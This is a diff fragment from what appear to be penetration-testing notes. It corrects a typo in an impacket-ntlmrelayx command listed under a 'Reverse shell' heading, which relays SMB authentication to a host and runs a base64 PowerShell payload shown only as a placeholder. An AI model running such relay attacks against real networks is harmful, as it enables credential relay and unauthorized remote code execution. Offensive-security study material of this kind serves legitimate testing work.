@@ -91,7 +91,7 @@ execute commands with -c
 
 ### Reverse shell
 ```shell
-mpacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c <powershell base 64>
+impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c <powershell base 64>
 ```
 Need client to connect to SMB share 
 
